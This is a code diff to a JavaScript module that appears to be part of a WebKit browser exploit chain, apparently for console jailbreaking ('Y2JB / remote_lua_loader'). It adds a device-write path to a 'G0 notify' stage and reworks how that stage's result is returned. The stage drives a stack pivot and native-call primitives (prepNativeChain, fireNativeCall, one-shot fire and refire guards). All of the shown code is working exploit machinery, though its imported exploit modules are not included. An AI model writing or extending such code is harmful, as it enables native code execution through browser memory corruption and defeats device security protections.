@@ -4,8 +4,8 @@
 import { int64 } from "./int64.js";
 import {
     prepNativeChain, firePivotGetpid, fireNativeCall,
-    stageNotify, bisectDisarmG0, bisectRestorePivotOnly,
-} from "./native_call.js?v=nc-20250901c";
+    stageNotify, fireNotifyDevWrite, bisectDisarmG0, bisectRestorePivotOnly,
+} from "./native_call.js?v=nc-20250901d";
 import { captureParseIntMainMf, loadStubCap } from "./stub_call.js?v=stub-7";
 
 let g0Prep = null;
@@ -193,28 +193,39 @@ export function fireG0Getpid(p, off, lk, opts) {
     return { path: "g0-getpid", ret, errno: ret, ok: nativeRetOk(ret), prep };
 }
 
-/** G0 + notify — same one-shot slot; use ?stubfire=g0notify instead of getpid. */
+/** G0 + notify — WebKit dev write path (Y2JB / remote_lua_loader). */
 export function fireG0Notify(p, off, lk, opts) {
     opts = opts || {};
     if (!lk) throw new Error("g0 notify: need lk");
     if (g0AlreadyFired() && !opts.allowRefire)
         throw new Error("g0: already fired — reload tab before notify");
     const prep = ensureG0Prep(p, off, lk, opts);
-    stubStep(opts, "G0-NOTIFY-FIRE", "lk=" + lk);
-    stageNotify(p, prep, lk, off, {
+    const path = opts.notifyPath || "dev";
+    stubStep(opts, "G0-NOTIFY-FIRE", path + " lk=" + lk);
+    const notifyOpts = {
         message: opts.message,
         iconUri: opts.iconUri,
-        format: opts.format,
+        format: opts.format || "osm",
         log: opts.log,
-    });
-    const ret = fireNativeCall(p, prep, off, {
-        hook: opts.hook || "cell30",
-        carrier: opts.carrier || null,
-    });
+        fireOpts: {
+            hook: opts.hook || "cell30",
+            carrier: opts.carrier || null,
+        },
+    };
+    let result;
+    if (path === "direct" || path === "knotify") {
+        stageNotify(p, prep, lk, off, notifyOpts);
+        const ret = fireNativeCall(p, prep, off, notifyOpts.fireOpts);
+        result = { path: "g0-notify-direct", ret, errno: ret, ok: nativeRetOk(ret), prep };
+    } else {
+        const r = fireNotifyDevWrite(p, prep, lk, off, notifyOpts);
+        result = { path: "g0-notify-dev", ret: 0, errno: 0, ok: r.ok, fd: r.fd, wr: r.wr, prep };
+    }
     postFireCleanup(p, prep, opts);
     markG0Fired("notify");
-    stubStep(opts, "G0-NOTIFY-DONE", "errno=" + ret + (nativeRetOk(ret) ? " OK" : " fail"));
-    return { path: "g0-notify", ret, errno: ret, ok: nativeRetOk(ret), prep };
+    stubStep(opts, "G0-NOTIFY-DONE", result.path + " errno=" + result.errno
+        + (result.ok ? " OK" : " fail"));
+    return result;
 }
 
 export function disarmStubG0(p) {
